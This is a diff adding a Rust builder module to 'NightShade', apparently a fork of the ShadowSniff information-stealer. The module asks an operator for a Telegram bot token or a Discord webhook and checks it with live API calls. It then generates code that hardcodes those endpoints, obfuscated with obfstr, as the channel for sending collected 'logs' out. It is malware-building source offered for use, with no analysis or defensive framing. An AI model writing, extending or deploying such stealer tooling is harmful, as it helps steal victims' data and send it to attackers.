@@ -1,0 +1,304 @@
+/*
+ * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
+ *
+ * MIT License
+ *
+ * Copyright (c) 2025 sqlerrorthing
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ * SOFTWARE.
+ */
+use crate::{Ask, AskInstanceFactory, ToExpr};
+use colored::Colorize;
+use inquire::validator::Validation;
+use inquire::{CustomType, InquireError, Select, Text, required};
+use proc_macro2::TokenStream;
+use quote::quote;
+use reqwest::blocking::Client;
+use sender::discord_webhook::DiscordWebhookSender;
+use sender::telegram_bot::TelegramBotSender;
+use serde::de::{MapAccess, Visitor};
+use serde::ser::SerializeStruct;
+use serde::{Deserialize, Deserializer, Serialize, Serializer, de};
+use std::fmt;
+use std::fmt::Display;
+use std::io::ErrorKind;
+use std::ops::Deref;
+use std::sync::Arc;
+
+#[enum_delegate::register]
+trait ValidateRequest {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>>;
+}
+
+impl Ask for TelegramBotSender {
+    fn ask() -> Result<Self, InquireError>
+    where
+        Self: Sized,
+    {
+        let token = Text::new("What is the bot token from @BotFather?")
+            .with_help_message("You can get it by creating a bot using @BotFather")
+            .with_placeholder("000000000:***********************************")
+            .with_validator(required!())
+            .prompt()?;
+
+        let chat_id = CustomType::<i64>::new("What is your chat ID?")
+            .with_help_message("You can use https://emmarnitechs.com/find-change-user-id-telegram to find your Telegram ID")
+            .with_placeholder("123456789")
+            .prompt()?;
+
+        Ok(Self::new(chat_id, token))
+    }
+}
+
+impl ValidateRequest for TelegramBotSender {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let url = format!(
+            "https://api.telegram.org/bot{}/getChat?chat_id={}",
+            self.token, self.chat_id
+        );
+
+        let client = Client::new();
+        let response = client.get(&url).send()?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(Box::new(std::io::Error::new(
+                ErrorKind::InvalidInput,
+                "Invalid creds",
+            )))
+        }
+    }
+}
+
+impl ToExpr for TelegramBotSender {
+    fn to_expr(&self, _args: ()) -> TokenStream {
+        let token = self.token.deref();
+        let chat_id = self.chat_id;
+
+        quote! {
+            sender::telegram_bot::TelegramBotSender::new(
+                #chat_id,
+                obfstr::obfstr!(#token),
+            )
+        }
+    }
+}
+
+impl Ask for DiscordWebhookSender {
+    fn ask() -> Result<Self, InquireError>
+    where
+        Self: Sized,
+    {
+        let validator = |webhook: &str| {
+            if webhook.starts_with("https://discord.com/api/webhooks/") {
+                Ok(Validation::Valid)
+            } else {
+                Ok(Validation::Invalid(
+                    "It seems like you provided invalid webhook".into(),
+                ))
+            }
+        };
+
+        let webhook = Text::new("What is the webhook URL?")
+            .with_help_message("If you’re stuck, read https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks.")
+            .with_placeholder("https://discord.com/api/webhooks/123456789/******************")
+            .with_validator(required!())
+            .with_validator(validator)
+            .prompt()?;
+
+        Ok(Self::new(webhook))
+    }
+}
+
+impl ValidateRequest for DiscordWebhookSender {
+    fn validate(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let client = Client::new();
+        let response = client.get(self.webhook.deref()).send()?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(Box::new(std::io::Error::new(
+                ErrorKind::InvalidInput,
+                "Invalid webhook",
+            )))
+        }
+    }
+}
+
+impl ToExpr for DiscordWebhookSender {
+    fn to_expr(&self, _args: ()) -> TokenStream {
+        let webhook = self.webhook.deref();
+        quote! {
+            sender::discord_webhook::DiscordWebhookSender::new(
+                obfstr::obfstr!(#webhook),
+            )
+        }
+    }
+}
+
+#[enum_delegate::implement(ValidateRequest)]
+#[derive(Clone, PartialEq, Eq)]
+pub enum SenderService {
+    TelegramBot(TelegramBotSender),
+    DiscordWebhook(DiscordWebhookSender),
+}
+
+impl Serialize for SenderService {
+    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
+    where
+        S: Serializer,
+    {
+        match self {
+            SenderService::TelegramBot(bot) => {
+                let mut state = serializer.serialize_struct("TelegramBot", 3)?;
+                state.serialize_field("type", "telegram_bot")?;
+                state.serialize_field("chat_id", &bot.chat_id)?;
+                state.serialize_field("token", &*bot.token)?;
+                state.end()
+            }
+            SenderService::DiscordWebhook(webhook) => {
+                let mut state = serializer.serialize_struct("DiscordWebhook", 2)?;
+                state.serialize_field("type", "discord_webhook")?;
+                state.serialize_field("webhook", &*webhook.webhook)?;
+                state.end()
+            }
+        }
+    }
+}
+
+impl<'de> Deserialize<'de> for SenderService {
+    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
+    where
+        D: Deserializer<'de>,
+    {
+        struct SenderVisitor;
+
+        impl<'de> Visitor<'de> for SenderVisitor {
+            type Value = SenderService;
+
+            fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {
+                formatter.write_str("a SenderService enum")
+            }
+
+            fn visit_map<V>(self, mut map: V) -> Result<Self::Value, V::Error>
+            where
+                V: MapAccess<'de>,
+            {
+                let mut kind: Option<String> = None;
+                let mut chat_id: Option<i64> = None;
+                let mut token: Option<String> = None;
+                let mut webhook: Option<String> = None;
+
+                while let Some(key) = map.next_key::<String>()? {
+                    match key.as_str() {
+                        "type" => kind = Some(map.next_value()?),
+                        "chat_id" => chat_id = Some(map.next_value()?),
+                        "token" => token = Some(map.next_value()?),
+                        "webhook" => webhook = Some(map.next_value()?),
+                        _ => {
+                            let _: serde::de::IgnoredAny = map.next_value()?;
+                        }
+                    }
+                }
+
+                match kind.as_deref() {
+                    Some("telegram_bot") => {
+                        let chat_id = chat_id.ok_or_else(|| de::Error::missing_field("chat_id"))?;
+                        let token = token.ok_or_else(|| de::Error::missing_field("token"))?;
+                        Ok(SenderService::TelegramBot(TelegramBotSender::new(
+                            chat_id, token,
+                        )))
+                    }
+                    Some("discord_webhook") => {
+                        let webhook = webhook.ok_or_else(|| de::Error::missing_field("webhook"))?;
+                        Ok(SenderService::DiscordWebhook(DiscordWebhookSender::new(
+                            webhook,
+                        )))
+                    }
+                    Some(other) => Err(de::Error::unknown_variant(
+                        other,
+                        &["telegram_bot", "discord_webhook"],
+                    )),
+                    None => Err(de::Error::missing_field("type")),
+                }
+            }
+        }
+
+        deserializer.deserialize_map(SenderVisitor)
+    }
+}
+
+struct TelegramFactory;
+struct DiscordFactory;
+
+impl Display for TelegramFactory {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "Telegram Bot")
+    }
+}
+impl Display for DiscordFactory {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "Discord Webhook")
+    }
+}
+
+impl AskInstanceFactory for TelegramFactory {
+    type Output = SenderService;
+
+    fn ask_instance(&self) -> Result<SenderService, InquireError> {
+        Ok(SenderService::TelegramBot(TelegramBotSender::ask()?))
+    }
+}
+impl AskInstanceFactory for DiscordFactory {
+    type Output = SenderService;
+
+    fn ask_instance(&self) -> Result<SenderService, InquireError> {
+        Ok(SenderService::DiscordWebhook(DiscordWebhookSender::ask()?))
+    }
+}
+
+impl Ask for SenderService {
+    fn ask() -> Result<Self, InquireError>
+    where
+        Self: Sized,
+    {
+        let factories: Vec<Arc<dyn AskInstanceFactory<Output = Self>>> =
+            vec![Arc::new(TelegramFactory), Arc::new(DiscordFactory)];
+
+        loop {
+            let ans = Select::new(
+                "Which service should the log be sent to?",
+                factories.clone(),
+            )
+            .prompt()?;
+
+            let instance = ans.ask_instance()?;
+            if instance.validate().is_ok() {
+                return Ok(instance);
+            }
+
+            println!(
+                "{}",
+                "[!] Invalid credentials provided, Take another one.".red()
+            );
+        }
+    }
+}
